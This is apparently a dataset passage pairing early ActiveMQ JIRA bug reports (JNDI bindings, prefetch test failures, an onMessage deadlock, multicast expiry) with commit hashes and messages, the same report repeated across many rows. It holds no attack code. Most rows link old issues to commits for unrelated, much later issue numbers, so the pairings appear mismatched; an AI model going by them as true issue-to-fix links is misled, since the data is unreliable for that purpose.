JmsQueueConnectionFactory/ClassName=org.codehaus.activemq.ActiveMQConnectionFactory
JmsQueueConnectionFactory/RefAddr/2/Encoding=String
JmsQueueConnectionFactory/RefAddr/1/Content=defaultPassword

How are other people getting their connections from Jndi?",531d67cd13d1fdb8c2e638040b4c635f16b264ca,https://issues.apache.org/jira/browse/AMQ-4682 - remove unecessary stack trace from info log re no mapping to getContents - usefull only for dev/debug
12481334,AMQ-46,"I created the following FS JNDI context, but noticed that the FactoryName is an interface, which I thought might be causing the problem -

#This file is used by the JNDI FSContext.
#Thu Jul 29 10:42:05 EST 2004
JmsQueueConnectionFactory/RefAddr/3/Content=defaultUser
JmsQueueConnectionFactory/RefAddr/3/Type=userName
JmsQueueConnectionFactory/FactoryName=org.codehaus.activemq.jndi.JNDIStorableInterface
JmsQueueConnectionFactory/RefAddr/0/Type=brokerURL
JmsQueueConnectionFactory/RefAddr/0/Encoding=String
JmsQueueConnectionFactory/RefAddr/3/Encoding=String
JmsQueueConnectionFactory/RefAddr/1/Encoding=String
JmsQueueConnectionFactory/RefAddr/1/Type=password
JmsQueueConnectionFactory/RefAddr/0/Content=tcp\://localhost\:61616
JmsQueueConnectionFactory/RefAddr/2/Content=false
JmsQueueConnectionFactory/RefAddr/2/Type=useEmbeddedBroker
JmsQueueConnectionFactory/ClassName=org.codehaus.activemq.ActiveMQConnectionFactory
JmsQueueConnectionFactory/RefAddr/2/Encoding=String
JmsQueueConnectionFactory/RefAddr/1/Content=defaultPassword

How are other people getting their connections from Jndi?",2fd52c9dcf6740d35ed78c0a5d88937a13416412,https://issues.apache.org/jira/browse/AMQ-4682 - add removal modification test
12481210,AMQ-42,"The test case in src/test/org/codehaus/activemq/usecases/ConsumeExactPrefetchSizeTest

If you uncomment the TODO line which sets the messageCount to be > 2 times the prefetch limit then the test case fails. Seems like a bug in the prefetch logic.

We should run this test case with count < prefetch, count == prefetch and count > prefetch to ensure the logic works properly in each case.",22474cd5414d568230cdb244741cc95b32777220,"Fixed: https://jira.logicblaze.com/jira/browse/AMQ-426
JMS api object now implement a toString() that can be used to correlate back to log messages on the message broker.

git-svn-id: https://svn.apache.org/repos/asf/incubator/activemq/trunk@358371 13f79535-47bb-0310-9956-ffa450edef68"
12481210,AMQ-42,"The test case in src/test/org/codehaus/activemq/usecases/ConsumeExactPrefetchSizeTest

If you uncomment the TODO line which sets the messageCount to be > 2 times the prefetch limit then the test case fails. Seems like a bug in the prefetch logic.

We should run this test case with count < prefetch, count == prefetch and count > prefetch to ensure the logic works properly in each case.",dcbb19509435703ebb16e1da65a8029206fbbe66,"Fixes AMQ-4201 : JMSX* properties not included in the getPropertyNames() enumeration

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1416515 13f79535-47bb-0310-9956-ffa450edef68"
12481210,AMQ-42,"The test case in src/test/org/codehaus/activemq/usecases/ConsumeExactPrefetchSizeTest

If you uncomment the TODO line which sets the messageCount to be > 2 times the prefetch limit then the test case fails. Seems like a bug in the prefetch logic.

We should run this test case with count < prefetch, count == prefetch and count > prefetch to ensure the logic works properly in each case.",44a7ffa94677b5791aee4979844cd4dceb681f7e,"https://issues.apache.org/jira/browse/AMQ-4219 - jolokia support

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1420809 13f79535-47bb-0310-9956-ffa450edef68"
12481210,AMQ-42,"The test case in src/test/org/codehaus/activemq/usecases/ConsumeExactPrefetchSizeTest

If you uncomment the TODO line which sets the messageCount to be > 2 times the prefetch limit then the test case fails. Seems like a bug in the prefetch logic.

We should run this test case with count < prefetch, count == prefetch and count > prefetch to ensure the logic works properly in each case.",c73027da1af8a36b8a01a82a87c64a874729a3b4,"https://issues.apache.org/jira/browse/AMQ-4221 - fix dangling reference to free page

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1421373 13f79535-47bb-0310-9956-ffa450edef68"
12481210,AMQ-42,"The test case in src/test/org/codehaus/activemq/usecases/ConsumeExactPrefetchSizeTest

If you uncomment the TODO line which sets the messageCount to be > 2 times the prefetch limit then the test case fails. Seems like a bug in the prefetch logic.

We should run this test case with count < prefetch, count == prefetch and count > prefetch to ensure the logic works properly in each case.",7011ea5b132509878e031c4347671904569c77c1,"fix for: https://issues.apache.org/jira/browse/AMQ-4254

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1433683 13f79535-47bb-0310-9956-ffa450edef68"
12481210,AMQ-42,"The test case in src/test/org/codehaus/activemq/usecases/ConsumeExactPrefetchSizeTest

If you uncomment the TODO line which sets the messageCount to be > 2 times the prefetch limit then the test case fails. Seems like a bug in the prefetch logic.

We should run this test case with count < prefetch, count == prefetch and count > prefetch to ensure the logic works properly in each case.",5ffb7a849a2df086612186287600367a5d296f2b,"apply patch for: https://issues.apache.org/jira/browse/AMQ-4266

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1437049 13f79535-47bb-0310-9956-ffa450edef68"
12481210,AMQ-42,"The test case in src/test/org/codehaus/activemq/usecases/ConsumeExactPrefetchSizeTest

If you uncomment the TODO line which sets the messageCount to be > 2 times the prefetch limit then the test case fails. Seems like a bug in the prefetch logic.

We should run this test case with count < prefetch, count == prefetch and count > prefetch to ensure the logic works properly in each case.",77312e5a6487dd2bd384bf3cf167cef6b61aa658,"Fixes AMQ-4258: Endless loop when received incorrect AMQP message

Applied patch sumbitted by Robert Balent.  Many thanks!



git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1437427 13f79535-47bb-0310-9956-ffa450edef68"
12481210,AMQ-42,"The test case in src/test/org/codehaus/activemq/usecases/ConsumeExactPrefetchSizeTest

If you uncomment the TODO line which sets the messageCount to be > 2 times the prefetch limit then the test case fails. Seems like a bug in the prefetch logic.

We should run this test case with count < prefetch, count == prefetch and count > prefetch to ensure the logic works properly in each case.",0b09fde97cba544fb0f31de72ce89202bdb97c6e,"Apply patch for: https://issues.apache.org/jira/browse/AMQ-4281

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1440012 13f79535-47bb-0310-9956-ffa450edef68"
12481210,AMQ-42,"The test case in src/test/org/codehaus/activemq/usecases/ConsumeExactPrefetchSizeTest

If you uncomment the TODO line which sets the messageCount to be > 2 times the prefetch limit then the test case fails. Seems like a bug in the prefetch logic.

We should run this test case with count < prefetch, count == prefetch and count > prefetch to ensure the logic works properly in each case.",6a097b97fe0ae316de93280271f31dffddd4bbbe,"https://issues.apache.org/jira/browse/AMQ-4296 - disable leveldb durable bits pending more work for 5.9

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1442953 13f79535-47bb-0310-9956-ffa450edef68"
12481210,AMQ-42,"The test case in src/test/org/codehaus/activemq/usecases/ConsumeExactPrefetchSizeTest

If you uncomment the TODO line which sets the messageCount to be > 2 times the prefetch limit then the test case fails. Seems like a bug in the prefetch logic.

We should run this test case with count < prefetch, count == prefetch and count > prefetch to ensure the logic works properly in each case.",548e52cde4d5f07f328b5ec56109026d9500ffdf,"another leveldb scenario that needs some investigation, but use case seems dubious - https://issues.apache.org/jira/browse/AMQ-4296

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1447700 13f79535-47bb-0310-9956-ffa450edef68"
12481210,AMQ-42,"The test case in src/test/org/codehaus/activemq/usecases/ConsumeExactPrefetchSizeTest

If you uncomment the TODO line which sets the messageCount to be > 2 times the prefetch limit then the test case fails. Seems like a bug in the prefetch logic.

We should run this test case with count < prefetch, count == prefetch and count > prefetch to ensure the logic works properly in each case.",5b5a818f4db6a472b194b2d2679b9212952272d9,"more exclusions - https://issues.apache.org/jira/browse/AMQ-4296

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1447725 13f79535-47bb-0310-9956-ffa450edef68"
12481210,AMQ-42,"The test case in src/test/org/codehaus/activemq/usecases/ConsumeExactPrefetchSizeTest

If you uncomment the TODO line which sets the messageCount to be > 2 times the prefetch limit then the test case fails. Seems like a bug in the prefetch logic.

We should run this test case with count < prefetch, count == prefetch and count > prefetch to ensure the logic works properly in each case.",b6703d6bd7b65cdd2175616bec59bcd1915f9a9c,"Fixes failing ThreeBrokerVirtualTopicNetwork test associated /w AMQ-4296

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1483878 13f79535-47bb-0310-9956-ffa450edef68"
12481329,AMQ-38,"This one is from Gianny...

I have encountered a major problem during the implementation:
* I have one Connection C;
* I create a Session S1 and one MessageConsumer MC1, which registers an asynchronous MessageListener ML1;
* ML1.onMessage is called;
* in the context of this invocation, I create a new Session S1 from C; and
* then I create a MessageProducer from S1.

This creation causes a deadlock as the various TransportChannel implementations, at least VmTransportChannel and TcpTransportChannel, dispatch the ML1.onMessage method in the same Thread that the one used to read incoming Packet. In other words, in the context of an onMessage method, one can not create some objects (e.g. MessageProducer, MessageConsumer), which need to be acknowledged (a Packet with ReceiptRequired). I do not understand why when creating a Session one does not need such an acknowledgement, though there is to be sure a very good reason. I had a look to the JMS specifications, and there are no restrictions on the above scenario.",681c1abf370aff00a2beda5b095f50cba2f8ece8,"add a test for: https://issues.apache.org/jira/browse/AMQ-3802

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1311239 13f79535-47bb-0310-9956-ffa450edef68"
12481329,AMQ-38,"This one is from Gianny...

I have encountered a major problem during the implementation:
* I have one Connection C;
* I create a Session S1 and one MessageConsumer MC1, which registers an asynchronous MessageListener ML1;
* ML1.onMessage is called;
* in the context of this invocation, I create a new Session S1 from C; and
* then I create a MessageProducer from S1.

This creation causes a deadlock as the various TransportChannel implementations, at least VmTransportChannel and TcpTransportChannel, dispatch the ML1.onMessage method in the same Thread that the one used to read incoming Packet. In other words, in the context of an onMessage method, one can not create some objects (e.g. MessageProducer, MessageConsumer), which need to be acknowledged (a Packet with ReceiptRequired). I do not understand why when creating a Session one does not need such an acknowledgement, though there is to be sure a very good reason. I had a look to the JMS specifications, and there are no restrictions on the above scenario.",ec87b17be013b1ddbf45c1ca91a24878f074dd2e,"test for: https://issues.apache.org/jira/browse/AMQ-3819

Creates a load test based on the user supplied ruby script.  There are four variations, one for each of the transport types.  Tests show that only the Stomp+NIO+SSL fails under this scenario. 

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1331481 13f79535-47bb-0310-9956-ffa450edef68"
12481329,AMQ-38,"This one is from Gianny...

I have encountered a major problem during the implementation:
* I have one Connection C;
* I create a Session S1 and one MessageConsumer MC1, which registers an asynchronous MessageListener ML1;
* ML1.onMessage is called;
* in the context of this invocation, I create a new Session S1 from C; and
* then I create a MessageProducer from S1.

This creation causes a deadlock as the various TransportChannel implementations, at least VmTransportChannel and TcpTransportChannel, dispatch the ML1.onMessage method in the same Thread that the one used to read incoming Packet. In other words, in the context of an onMessage method, one can not create some objects (e.g. MessageProducer, MessageConsumer), which need to be acknowledged (a Packet with ReceiptRequired). I do not understand why when creating a Session one does not need such an acknowledgement, though there is to be sure a very good reason. I had a look to the JMS specifications, and there are no restrictions on the above scenario.",e4d90d9281a34fc8ed1c521107ad6245950367d4,"Add test to show no issue for: https://issues.apache.org/jira/browse/AMQ-3835

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1339589 13f79535-47bb-0310-9956-ffa450edef68"
12481329,AMQ-38,"This one is from Gianny...

I have encountered a major problem during the implementation:
* I have one Connection C;
* I create a Session S1 and one MessageConsumer MC1, which registers an asynchronous MessageListener ML1;
* ML1.onMessage is called;
* in the context of this invocation, I create a new Session S1 from C; and
* then I create a MessageProducer from S1.

This creation causes a deadlock as the various TransportChannel implementations, at least VmTransportChannel and TcpTransportChannel, dispatch the ML1.onMessage method in the same Thread that the one used to read incoming Packet. In other words, in the context of an onMessage method, one can not create some objects (e.g. MessageProducer, MessageConsumer), which need to be acknowledged (a Packet with ReceiptRequired). I do not understand why when creating a Session one does not need such an acknowledgement, though there is to be sure a very good reason. I had a look to the JMS specifications, and there are no restrictions on the above scenario.",3082a20520ac73ff954e420b0981d2c54b1bfd24,"Unit test that reproduces AMQ-3841

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1339660 13f79535-47bb-0310-9956-ffa450edef68"
12481329,AMQ-38,"This one is from Gianny...

I have encountered a major problem during the implementation:
* I have one Connection C;
* I create a Session S1 and one MessageConsumer MC1, which registers an asynchronous MessageListener ML1;
* ML1.onMessage is called;
* in the context of this invocation, I create a new Session S1 from C; and
* then I create a MessageProducer from S1.

This creation causes a deadlock as the various TransportChannel implementations, at least VmTransportChannel and TcpTransportChannel, dispatch the ML1.onMessage method in the same Thread that the one used to read incoming Packet. In other words, in the context of an onMessage method, one can not create some objects (e.g. MessageProducer, MessageConsumer), which need to be acknowledged (a Packet with ReceiptRequired). I do not understand why when creating a Session one does not need such an acknowledgement, though there is to be sure a very good reason. I had a look to the JMS specifications, and there are no restrictions on the above scenario.",53fff528a71193e3af8b7c2dfb5b63dd509fac83,"Apply patch for: https://issues.apache.org/jira/browse/AMQ-3817

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1340219 13f79535-47bb-0310-9956-ffa450edef68"
12481329,AMQ-38,"This one is from Gianny...

I have encountered a major problem during the implementation:
* I have one Connection C;
* I create a Session S1 and one MessageConsumer MC1, which registers an asynchronous MessageListener ML1;
* ML1.onMessage is called;
* in the context of this invocation, I create a new Session S1 from C; and
* then I create a MessageProducer from S1.

This creation causes a deadlock as the various TransportChannel implementations, at least VmTransportChannel and TcpTransportChannel, dispatch the ML1.onMessage method in the same Thread that the one used to read incoming Packet. In other words, in the context of an onMessage method, one can not create some objects (e.g. MessageProducer, MessageConsumer), which need to be acknowledged (a Packet with ReceiptRequired). I do not understand why when creating a Session one does not need such an acknowledgement, though there is to be sure a very good reason. I had a look to the JMS specifications, and there are no restrictions on the above scenario.",1b28cf1792e6eb0b2f49d46ef2d02652977ae7be,"https://issues.apache.org/jira/browse/AMQ-3853 - activemq-web-console osgi import

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1341810 13f79535-47bb-0310-9956-ffa450edef68"
12481329,AMQ-38,"This one is from Gianny...

I have encountered a major problem during the implementation:
* I have one Connection C;
* I create a Session S1 and one MessageConsumer MC1, which registers an asynchronous MessageListener ML1;
* ML1.onMessage is called;
* in the context of this invocation, I create a new Session S1 from C; and
* then I create a MessageProducer from S1.

This creation causes a deadlock as the various TransportChannel implementations, at least VmTransportChannel and TcpTransportChannel, dispatch the ML1.onMessage method in the same Thread that the one used to read incoming Packet. In other words, in the context of an onMessage method, one can not create some objects (e.g. MessageProducer, MessageConsumer), which need to be acknowledged (a Packet with ReceiptRequired). I do not understand why when creating a Session one does not need such an acknowledgement, though there is to be sure a very good reason. I had a look to the JMS specifications, and there are no restrictions on the above scenario.",87b2920927573addf8278bdeb41740be3ffbab32,"https://issues.apache.org/jira/browse/AMQ-3881 - handy diag script to gather info about the host machine and broker java process and combine into a compressed log, some users have found it valuable in production

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1355055 13f79535-47bb-0310-9956-ffa450edef68"
12481329,AMQ-38,"This one is from Gianny...

I have encountered a major problem during the implementation:
* I have one Connection C;
* I create a Session S1 and one MessageConsumer MC1, which registers an asynchronous MessageListener ML1;
* ML1.onMessage is called;
* in the context of this invocation, I create a new Session S1 from C; and
* then I create a MessageProducer from S1.

This creation causes a deadlock as the various TransportChannel implementations, at least VmTransportChannel and TcpTransportChannel, dispatch the ML1.onMessage method in the same Thread that the one used to read incoming Packet. In other words, in the context of an onMessage method, one can not create some objects (e.g. MessageProducer, MessageConsumer), which need to be acknowledged (a Packet with ReceiptRequired). I do not understand why when creating a Session one does not need such an acknowledgement, though there is to be sure a very good reason. I had a look to the JMS specifications, and there are no restrictions on the above scenario.",9cda4262e96a31a2bee1f3271030da0341f452c2,"https://issues.apache.org/jira/browse/AMQ-3885 - add max thread pool size to properties

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1365945 13f79535-47bb-0310-9956-ffa450edef68"
12481303,AMQ-33,"When using multicast, setting msg expiry by calling msg.setJMSExpiration(10000) actually stops msgs from being sent!

The following error is logged:

2004-06-21 16:40:03,625 [Thread-0] INFO  org.codehaus.activemq.service.vm.VMSubscription - Message probably expired: null


If I skip the call to setJMSExpiration(), msg will get sent.


Also, when using a server using TCP protocol, setJMSExpiration() works too.",a1c19c5e49db4312d2f27e0ef60945c13c4f6fa7,"https://issues.apache.org/jira/browse/AMQ-3316 - Memory leak in ConnectionStateTracker with MessagePull objects. Patch applied with thanks, good catch\!

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1102018 13f79535-47bb-0310-9956-ffa450edef68"
12481303,AMQ-33,"When using multicast, setting msg expiry by calling msg.setJMSExpiration(10000) actually stops msgs from being sent!

The following error is logged:

2004-06-21 16:40:03,625 [Thread-0] INFO  org.codehaus.activemq.service.vm.VMSubscription - Message probably expired: null


If I skip the call to setJMSExpiration(), msg will get sent.


Also, when using a server using TCP protocol, setJMSExpiration() works too.",6fefadb620421c74547fe34e2e0209ec1fdde983,"https://issues.apache.org/jira/browse/AMQ-3341 - reseting destination map

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1129741 13f79535-47bb-0310-9956-ffa450edef68"
12481303,AMQ-33,"When using multicast, setting msg expiry by calling msg.setJMSExpiration(10000) actually stops msgs from being sent!

The following error is logged:

2004-06-21 16:40:03,625 [Thread-0] INFO  org.codehaus.activemq.service.vm.VMSubscription - Message probably expired: null


If I skip the call to setJMSExpiration(), msg will get sent.


Also, when using a server using TCP protocol, setJMSExpiration() works too.",0601fb71186e330cbae4641ccdbaa44df6ae1b94,"https://issues.apache.org/jira/browse/AMQ-3348 - network connector restart

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1130441 13f79535-47bb-0310-9956-ffa450edef68"
12481303,AMQ-33,"When using multicast, setting msg expiry by calling msg.setJMSExpiration(10000) actually stops msgs from being sent!

The following error is logged:

2004-06-21 16:40:03,625 [Thread-0] INFO  org.codehaus.activemq.service.vm.VMSubscription - Message probably expired: null


If I skip the call to setJMSExpiration(), msg will get sent.


Also, when using a server using TCP protocol, setJMSExpiration() works too.",27e6dd7e8cfb88fcffba07440d1febd96df9f9b6,"https://issues.apache.org/jira/browse/AMQ-3347 - network connector restart/re-add

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1130469 13f79535-47bb-0310-9956-ffa450edef68"
12481303,AMQ-33,"When using multicast, setting msg expiry by calling msg.setJMSExpiration(10000) actually stops msgs from being sent!

The following error is logged:

2004-06-21 16:40:03,625 [Thread-0] INFO  org.codehaus.activemq.service.vm.VMSubscription - Message probably expired: null


If I skip the call to setJMSExpiration(), msg will get sent.


Also, when using a server using TCP protocol, setJMSExpiration() works too.",e085ed4d5f9704b42ebb2065bd45674af43f623d,"https://issues.apache.org/jira/browse/AMQ-3378 - isSlowConsumer for SubscriptionView

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1140098 13f79535-47bb-0310-9956-ffa450edef68"
12481303,AMQ-33,"When using multicast, setting msg expiry by calling msg.setJMSExpiration(10000) actually stops msgs from being sent!

The following error is logged:

2004-06-21 16:40:03,625 [Thread-0] INFO  org.codehaus.activemq.service.vm.VMSubscription - Message probably expired: null


If I skip the call to setJMSExpiration(), msg will get sent.


Also, when using a server using TCP protocol, setJMSExpiration() works too.",f7988655d3fbf57f290f8f8cbc25c15dc65e3b37,"https://issues.apache.org/jira/browse/AMQ-3379 - unique property eviction strategy

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1140531 13f79535-47bb-0310-9956-ffa450edef68"
12481303,AMQ-33,"When using multicast, setting msg expiry by calling msg.setJMSExpiration(10000) actually stops msgs from being sent!

The following error is logged:

2004-06-21 16:40:03,625 [Thread-0] INFO  org.codehaus.activemq.service.vm.VMSubscription - Message probably expired: null


If I skip the call to setJMSExpiration(), msg will get sent.


Also, when using a server using TCP protocol, setJMSExpiration() works too.",fa2b058dd52fb447b893512dfbb5eb370c456926,"https://issues.apache.org/jira/browse/AMQ-3375: stomp consumer might not receive all msgs of a virtual topic queue with memory limits. Committing tims test case which works fine post resolution of https://issues.apache.org/jira/browse/AMQ-3434

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1153463 13f79535-47bb-0310-9956-ffa450edef68"
12481303,AMQ-33,"When using multicast, setting msg expiry by calling msg.setJMSExpiration(10000) actually stops msgs from being sent!

The following error is logged:

2004-06-21 16:40:03,625 [Thread-0] INFO  org.codehaus.activemq.service.vm.VMSubscription - Message probably expired: null


If I skip the call to setJMSExpiration(), msg will get sent.


Also, when using a server using TCP protocol, setJMSExpiration() works too.",3a806e98dc74251e22befcf04633c0210c81aeef,"Test for: https://issues.apache.org/jira/browse/AMQ-3324

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1181022 13f79535-47bb-0310-9956-ffa450edef68"
12481303,AMQ-33,"When using multicast, setting msg expiry by calling msg.setJMSExpiration(10000) actually stops msgs from being sent!

The following error is logged:

2004-06-21 16:40:03,625 [Thread-0] INFO  org.codehaus.activemq.service.vm.VMSubscription - Message probably expired: null


If I skip the call to setJMSExpiration(), msg will get sent.


Also, when using a server using TCP protocol, setJMSExpiration() works too.",2cb8ed221bbf8a69ad8bb6af8fc929aee8129381,"add test case from: https://issues.apache.org/jira/browse/AMQ-3359

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1242386 13f79535-47bb-0310-9956-ffa450edef68"
12481303,AMQ-33,"When using multicast, setting msg expiry by calling msg.setJMSExpiration(10000) actually stops msgs from being sent!

The following error is logged:

2004-06-21 16:40:03,625 [Thread-0] INFO  org.codehaus.activemq.service.vm.VMSubscription - Message probably expired: null


If I skip the call to setJMSExpiration(), msg will get sent.


Also, when using a server using TCP protocol, setJMSExpiration() works too.",f5dd1256e467966f14a7447a4cd1fc45f21f19a3,https://issues.apache.org/jira/browse/AMQ-3303 - test that validates fix
12481274,AMQ-30,"I was trying to learn how to use ActiveMQ.  

I try using Sun's Filesystem JNDI provider instead of using say RMI registry or some other JNDI provider that comes with app servers.

The problem I am having is, when I bind an ActiveMQTopic to Sun's filesystem provider, what I looked-up from the other JVM is a javax.naming.Reference object instead of what I was expecting i.e. ActiveMQTopic objects.

Looking into the .bindings used by the filesystem JNDI reveals what I think is the explaination:

	#This file is used by the JNDI FSContext.
	#Thu Jun 03 14:05:58 PDT 2004
	FOO/RefAddr/0/Encoding=String
	FOO/RefAddr/0/Content=FOO
	FOO/FactoryName=com.spirit.core.util.resolver.JNDIResolver
	FOO/ClassName=org.codehaus.activemq.message.ActiveMQTopic
	FOO/RefAddr/0/Type=physicalName


Is it intentional that the FactoryName is set to com.spirit.core.util.resolver.JNDIResolver?
Isn't spirit soft commercial software?

Looking into the code, it seems to be coming from org.codehaus.activemq.jndi.JNDIReferenceFactory.createReference().


Well, hope to hear from you soon about this. 


Many thanks in advance.",d650d0c7e1e700316a34baee889fbd948c30da72,"apply fix from https://issues.apache.org/activemq/browse/AMQ-3007 - with thanks

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1028637 13f79535-47bb-0310-9956-ffa450edef68"
12481274,AMQ-30,"I was trying to learn how to use ActiveMQ.  

I try using Sun's Filesystem JNDI provider instead of using say RMI registry or some other JNDI provider that comes with app servers.

The problem I am having is, when I bind an ActiveMQTopic to Sun's filesystem provider, what I looked-up from the other JVM is a javax.naming.Reference object instead of what I was expecting i.e. ActiveMQTopic objects.

Looking into the .bindings used by the filesystem JNDI reveals what I think is the explaination:

	#This file is used by the JNDI FSContext.
	#Thu Jun 03 14:05:58 PDT 2004
	FOO/RefAddr/0/Encoding=String
	FOO/RefAddr/0/Content=FOO
	FOO/FactoryName=com.spirit.core.util.resolver.JNDIResolver
	FOO/ClassName=org.codehaus.activemq.message.ActiveMQTopic
	FOO/RefAddr/0/Type=physicalName


Is it intentional that the FactoryName is set to com.spirit.core.util.resolver.JNDIResolver?
Isn't spirit soft commercial software?

Looking into the code, it seems to be coming from org.codehaus.activemq.jndi.JNDIReferenceFactory.createReference().


Well, hope to hear from you soon about this. 


Many thanks in advance.",4f327e091beb0b1aa01060b72bc8f810ae44ab0f,"https://issues.apache.org/activemq/browse/AMQ-3020 - missing properties file

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1032904 13f79535-47bb-0310-9956-ffa450edef68"
12481274,AMQ-30,"I was trying to learn how to use ActiveMQ.  

I try using Sun's Filesystem JNDI provider instead of using say RMI registry or some other JNDI provider that comes with app servers.

The problem I am having is, when I bind an ActiveMQTopic to Sun's filesystem provider, what I looked-up from the other JVM is a javax.naming.Reference object instead of what I was expecting i.e. ActiveMQTopic objects.

Looking into the .bindings used by the filesystem JNDI reveals what I think is the explaination:

	#This file is used by the JNDI FSContext.
	#Thu Jun 03 14:05:58 PDT 2004
	FOO/RefAddr/0/Encoding=String
	FOO/RefAddr/0/Content=FOO
	FOO/FactoryName=com.spirit.core.util.resolver.JNDIResolver
	FOO/ClassName=org.codehaus.activemq.message.ActiveMQTopic
	FOO/RefAddr/0/Type=physicalName


Is it intentional that the FactoryName is set to com.spirit.core.util.resolver.JNDIResolver?
Isn't spirit soft commercial software?

Looking into the code, it seems to be coming from org.codehaus.activemq.jndi.JNDIReferenceFactory.createReference().


Well, hope to hear from you soon about this. 


Many thanks in advance.",3e8abcc43f2e2786220a1b1297d05237506af54f,"https://issues.apache.org/activemq/browse/AMQ-3020 - imrpove test timings

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1032969 13f79535-47bb-0310-9956-ffa450edef68"
12481274,AMQ-30,"I was trying to learn how to use ActiveMQ.  

I try using Sun's Filesystem JNDI provider instead of using say RMI registry or some other JNDI provider that comes with app servers.

The problem I am having is, when I bind an ActiveMQTopic to Sun's filesystem provider, what I looked-up from the other JVM is a javax.naming.Reference object instead of what I was expecting i.e. ActiveMQTopic objects.

Looking into the .bindings used by the filesystem JNDI reveals what I think is the explaination:

	#This file is used by the JNDI FSContext.
	#Thu Jun 03 14:05:58 PDT 2004
	FOO/RefAddr/0/Encoding=String
	FOO/RefAddr/0/Content=FOO
	FOO/FactoryName=com.spirit.core.util.resolver.JNDIResolver
	FOO/ClassName=org.codehaus.activemq.message.ActiveMQTopic
	FOO/RefAddr/0/Type=physicalName


Is it intentional that the FactoryName is set to com.spirit.core.util.resolver.JNDIResolver?
Isn't spirit soft commercial software?

Looking into the code, it seems to be coming from org.codehaus.activemq.jndi.JNDIReferenceFactory.createReference().


Well, hope to hear from you soon about this. 


Many thanks in advance.",eb034b4bc9361280993277843bac79acd6c08dec,"applied patch and test from https://issues.apache.org/activemq/browse/AMQ-3029 with thanks

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1035264 13f79535-47bb-0310-9956-ffa450edef68"
12481274,AMQ-30,"I was trying to learn how to use ActiveMQ.  

I try using Sun's Filesystem JNDI provider instead of using say RMI registry or some other JNDI provider that comes with app servers.

The problem I am having is, when I bind an ActiveMQTopic to Sun's filesystem provider, what I looked-up from the other JVM is a javax.naming.Reference object instead of what I was expecting i.e. ActiveMQTopic objects.

Looking into the .bindings used by the filesystem JNDI reveals what I think is the explaination:

	#This file is used by the JNDI FSContext.
	#Thu Jun 03 14:05:58 PDT 2004
	FOO/RefAddr/0/Encoding=String
	FOO/RefAddr/0/Content=FOO
	FOO/FactoryName=com.spirit.core.util.resolver.JNDIResolver
	FOO/ClassName=org.codehaus.activemq.message.ActiveMQTopic
	FOO/RefAddr/0/Type=physicalName


Is it intentional that the FactoryName is set to com.spirit.core.util.resolver.JNDIResolver?
Isn't spirit soft commercial software?

Looking into the code, it seems to be coming from org.codehaus.activemq.jndi.JNDIReferenceFactory.createReference().


Well, hope to hear from you soon about this. 


Many thanks in advance.",fe1bf48a1d95396e17ffeb5a36bbd057c159a8f7,"https://issues.apache.org/activemq/browse/AMQ-3044 - adding example in activemq-security.xml

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1036530 13f79535-47bb-0310-9956-ffa450edef68"
12481274,AMQ-30,"I was trying to learn how to use ActiveMQ.  

I try using Sun's Filesystem JNDI provider instead of using say RMI registry or some other JNDI provider that comes with app servers.

The problem I am having is, when I bind an ActiveMQTopic to Sun's filesystem provider, what I looked-up from the other JVM is a javax.naming.Reference object instead of what I was expecting i.e. ActiveMQTopic objects.

Looking into the .bindings used by the filesystem JNDI reveals what I think is the explaination:

	#This file is used by the JNDI FSContext.
	#Thu Jun 03 14:05:58 PDT 2004
	FOO/RefAddr/0/Encoding=String
	FOO/RefAddr/0/Content=FOO
	FOO/FactoryName=com.spirit.core.util.resolver.JNDIResolver
	FOO/ClassName=org.codehaus.activemq.message.ActiveMQTopic
	FOO/RefAddr/0/Type=physicalName


Is it intentional that the FactoryName is set to com.spirit.core.util.resolver.JNDIResolver?
Isn't spirit soft commercial software?

Looking into the code, it seems to be coming from org.codehaus.activemq.jndi.JNDIReferenceFactory.createReference().


Well, hope to hear from you soon about this. 


Many thanks in advance.",81f3935cf33feeca9e3380bc01f132e2fc45e57b,"resolve: https://issues.apache.org/activemq/browse/AMQ-3056 - do not throw on redelivery ack for a topic

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1039392 13f79535-47bb-0310-9956-ffa450edef68"
12481274,AMQ-30,"I was trying to learn how to use ActiveMQ.  

I try using Sun's Filesystem JNDI provider instead of using say RMI registry or some other JNDI provider that comes with app servers.

The problem I am having is, when I bind an ActiveMQTopic to Sun's filesystem provider, what I looked-up from the other JVM is a javax.naming.Reference object instead of what I was expecting i.e. ActiveMQTopic objects.

Looking into the .bindings used by the filesystem JNDI reveals what I think is the explaination:

	#This file is used by the JNDI FSContext.
	#Thu Jun 03 14:05:58 PDT 2004
	FOO/RefAddr/0/Encoding=String
	FOO/RefAddr/0/Content=FOO
